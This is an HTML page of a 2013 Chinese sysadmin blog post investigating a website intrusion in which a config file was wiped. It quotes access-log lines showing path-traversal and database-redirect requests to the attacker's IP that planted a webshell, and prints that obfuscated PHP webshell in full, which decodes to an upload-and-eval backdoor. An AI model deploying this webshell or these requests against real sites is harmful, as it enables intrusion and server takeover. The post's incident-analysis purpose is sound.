@@ -1,0 +1,367 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta name="generator" content="Hugo 0.49" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>一次入侵检查 | 鑫的方向</title>
+    <meta property="og:title" content="一次入侵检查 - 鑫的方向">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content="2013-10-02T21:38:00&#43;08:00">
+        
+        
+    <meta property="article:modified_time" content="2013-10-02T21:38:00&#43;08:00">
+        
+    <meta name="Keywords" content="linux,运维,devops,python,golang">
+    <meta name="description" content="一次入侵检查">
+        
+    <meta name="author" content="dongxin">
+    <meta property="og:url" content="https://xinlogs.com/post/2013-10-02-yi-ci-ru-qin-jian-cha/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href="/css/normalize.css">
+    
+    <link rel="stylesheet" href="/css/prism.css">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+
+    
+    
+</head>
+
+<body>
+<header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://xinlogs.com">
+                        鑫的方向
+                    </a>
+                
+                <p class="description">嗜欲深着，天机浅！</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://xinlogs.com">首页</a>
+                    
+                    <a  href="/archives/" title="归档">归档</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+<div id="body">
+    <div class="container">
+        <div class="col-group">
+
+            <div class="col-8" id="main">
+                <div class="res-cons">
+                    <article class="post">
+                        <header>
+                            <h1 class="post-title">一次入侵检查</h1>
+                        </header>
+                        <date class="post-meta meta-date">
+                            2013年10月2日
+                            21:38
+                        </date>
+                        
+                        <div class="post-meta meta-category">
+                            |
+                            
+                                <a href="/categories/linux">Linux</a>
+                            
+                        </div>
+                        
+                        
+                        <div class="post-content">
+                            <p>#10.1放假期间的一次入侵处理#</p>
+
+<p>今天一个网站的朋友给我电话，说网站无法访问了。我尝试访问了下，提示数据库不存在。开始以为数据库出现问题了，尝试访问子域名无问题。ssh上去看到数据库正常。
+检查文件的时候，发现mysql_config.php是早上6点多修改过的。比较奇怪了。</p>
+
+<p>打开mysql_config.php发现已经被清空了。于是赶紧处理下，让网站恢复了正常。</p>
+
+<p></p>
+
+<p>##查找原因##
+因为文件被篡改了，还是比较严重的。于是开始尝试分析原因。</p>
+
+<p>首先检查了登陆logs，并没有发现异常。可以初步排除是ssh上来修改的。服务器没有开放ftp，所以就怀疑是通过web程序的漏洞实现的。</p>
+
+<p>根据文件的修改时间，调出访问日志查找。最终找到如下三个异常访问</p>
+
+<pre><code>103.14.144.41 - - [02/Oct/2013:06:18:10 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot; -
+103.14.144.41 - - [02/Oct/2013:06:18:10 +0800] &quot;GET /do/fujsarticle.php?type=like&amp;FileName=../data/mysql_config.php&amp;submit=fuck HTTP/1.1&quot; 200 37 &quot;-&quot; &quot;-&quot; -
+103.14.144.41 - - [02/Oct/2013:06:18:11 +0800] &quot;GET /news/fujsarticle.php?type=like&amp;FileName=../data/mysql_config.php&amp;submit=fuck HTTP/1.1&quot; 404 36 &quot;-&quot; &quot;-&quot; -
+103.14.144.41 - - [02/Oct/2013:06:18:11 +0800] &quot;GET /do/jf.php?dbuser=getshell&amp;dbhost=103.14.144.41&amp;dbpw=shellpwd&amp;dbname=getshell&amp;pre=qb_&amp;dbcharset=gbk&amp;submit=getshell HTTP/1.1&quot; 200 12140 &quot;-&quot; &quot;-&quot; -
+103.14.144.41 - - [02/Oct/2013:06:18:11 +0800] &quot;HEAD /do/c.php HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot; -
+
+</code></pre>
+
+<p>通过访问fujsarticle.php、jf.php文件来提交构造好的参数，实现对文件的修改并通过调用自己的数据库内容，来传送过来一个c.php的webshell。这两个文件都是程序自带的文件，我也不好修改。目前只是把对应目录权限配置了，让www的用户无法写入文件了。后面还要让程序人员看看如何彻底解决下。</p>
+
+<p>##webshell##
+这个webshell很有意思。通过各种字符替换和转换编码，达到了很好的加密伪装效果。下面就是那个webshell，感谢去的可以看看，学习学习。</p>
+
+<pre><code class="language-php">&lt;?php
+$tj=&quot;IGluaV9zZXQoJ2h0bWxfZXJyb3JrbzJyxmYWxzZSk7aW5pX3NldCgnrbZGlzcGxheV9lcnJvcnMnLGZhrbbHNlKrbTtAcHrbJrblZ19yZXBsYWNlKCIvLrb2UrbiLCRfUE9TVFrbsnRkVORrbyddLCJrbBY2Nlrbc3MrbgRGVuaWVkIikrb7QrbHByZWdrbfcmVwbGFjZS&quot;;
+$ju = str_replace(&quot;si&quot;,&quot;&quot;,&quot;sissitsirsi_rsiesipsilasicsie&quot;);
+$gie=&quot;krbXrb0ZJTErbVTWyJrb1cGZpbGUiXVrbsibmFtZSJdO2lmKCFmaWxlX2V4aXN0cygkX0ZJTEVTrbWyJ1cGZpbGUiXVsirbbmrbFtZrbSJdKSl7IGrbNvcHkorbJF9GSUxFU1sidXBrbmaWxrblIl1bInRtcF9rbuYW1lIl0sICRfRklMRVrbNbInVwZmlsZSJdWyJrbuYrbW1&quot;;
+$zc=&quot;giL1xzKlxbcGhwXrbF0oLis/KVrbxrbbXC9wrbaHrbBcXVxzKrbi9pZXMrbiLrbCAiXFwxIiwgJrbF9HRVRbJ0ZFTrbkcnXSk7aWYoJF9HRVRbInBrIl09PSJsb3ZlIil7aWYgKCRfU0VSVkVrbSWydSRVFVRVNUX01FVEhPRCrbddID09ICrbdQT1NUJykgeyBlY2hvICJrb1cmrbw6Ii4&quot;;
+$ro=&quot;lIl0pOyB9frbT8+rbPGZvcm0gbWVrb0aG9kPSJwb3N0IrbiBlbmN0erbXBlPSJrbtdWx0rbaXBrbhcnQvZrbm9ybS1krbYXRhIj48aW5wdrbXQgbmrbFtZT0idXBmaWxlIiB0eXBlPSJmaWxlIj48aW5wdXQgdHlwZTrb0ic3VibWl0IiB2YWx1ZT0ib2siPjwvZm9yrbbT48P3BocCB9&quot;;
+$nx = $ju(&quot;g&quot;, &quot;&quot;, &quot;gbgagse6g4g_dgegcgogde&quot;);
+$xq = $ju(&quot;v&quot;,&quot;&quot;,&quot;vcvreavtvev_vfvuvnvcvtvivovn&quot;);
+$baj = $xq('', $nx($ju(&quot;rb&quot;, &quot;&quot;, $tj.$zc.$gie.$ro))); $baj();
+?&gt;
+
+</code></pre>
+                        </div>
+
+                        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/post/2013-09-30-update-git/">update git</a></li>
+        
+        <li><a href="/post/2013-08-12-ruby-with-activerecord-access-mysql/">Ruby采用ActiveRecord方式访问Mysql</a></li>
+        
+        <li><a href="/post/2013-05-06-securecrt-for-mac-store-password/">mac下的secureCRT如何保存密码？</a></li>
+        
+        <li><a href="/post/2013-04-29-digitalocean-vps/">digitalocean-vps</a></li>
+        
+        <li><a href="/post/2013-04-25-nginxzhi-chi-thinkphpde-pathinfomo-shi/">nginx支持thinkphp的pathinfo模式</a></li>
+        
+    </ul>
+</div>
+
+
+                        <div class="post-meta meta-tags">
+                            
+                            没有标签
+                            
+                        </div>
+                    </article>
+                    
+    
+
+    
+    
+                </div>
+            </div>
+            <div id="secondary">
+    <section class="widget">
+        <form id="search" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://xinlogs.com">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+        <ul class="widget-list">
+            
+            <li>
+                <a href="https://xinlogs.com/post/2015-02-16-hexo/" title="切换到hexo">切换到hexo</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-08-07-nginx-http-1-dot-1-upstream/" title="nginx通过http/1.1访问upstream">nginx通过http/1.1访问upstream</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-06-14-disk-space-error-while-installing-centos5/" title="CentOS 5.10安装报磁盘空间错误">CentOS 5.10安装报磁盘空间错误</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-06-05-linux-rescan-scsi/" title="linux-rescan-scsi">linux-rescan-scsi</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-06-05-zabbix-custom-inventory/" title="自定义zabbix inventory界面">自定义zabbix inventory界面</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-04-15-owncloud-zip-filename/" title="owncloud打包zip下载文件名乱码">owncloud打包zip下载文件名乱码</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-04-14-dig-debug-dns-query/" title="dig排查dns问题">dig排查dns问题</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-04-14-edit-octopress-on-multiple-computers/" title="多电脑同步octopress">多电脑同步octopress</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-04-08-zabbix-introduction/" title="zabbix介绍">zabbix介绍</a>
+            </li>
+            
+            <li>
+                <a href="https://xinlogs.com/post/2014-02-09-backup-to-aliyun-oss/" title="备份到阿里云的oss">备份到阿里云的oss</a>
+            </li>
+            
+        </ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title">分类</h3>
+        <ul class="widget-list">
+            
+            <li>
+                <a href="/categories/cloudstack/">cloudstack(1)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/css/">css(1)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/database/">database(11)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/game/">game(13)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/git/">git(2)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/hardware/">hardware(9)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/host/">host(4)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/java/">java(3)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/life/">life(3)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/linux/">linux(47)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/mac/">mac(5)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/mobile/">mobile(4)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/octopress/">octopress(3)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/php/">php(15)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/plan/">plan(1)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/rails/">rails(9)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/ruby/">ruby(3)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/software/">software(5)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/vim/">vim(2)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/virtualization/">virtualization(9)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/website/">website(3)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/windows/">windows(6)</a>
+            </li>
+            
+            <li>
+                <a href="/categories/zabbix/">zabbix(1)</a>
+            </li>
+            
+        </ul>
+    </section>
+
+    <section class="widget">
+            <h3 class="widget-title">标签</h3>
+            <div class="tagcloud">
+                
+            </div>
+        </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+        </div>
+    </div>
+</div>
+<footer id="footer">
+    <div class="container">
+        &copy; 2018 <a href="https://xinlogs.com">鑫的方向 By dongxin</a>.
+        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io">Hugo</a>.
+        <a href="http://www.flysnow.org/">Theme</a> based on <a href="https://github.com/rujews/maupassant-hugo">maupassant</a>.
+        
+    </div>
+</footer>
+
+
+<script type="text/javascript" src="/js/prism.js" async="true"></script>
+<script type="text/javascript">
+window.MathJax = {
+    tex2jax: {
+        inlineMath: [ ['$','$'] ],
+        processEscapes: true
+    }
+};
+</script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src="/js/totop.js?v=0.0.0" async=""></script>
+
+
+
+
+
+
+</body>
+</html>
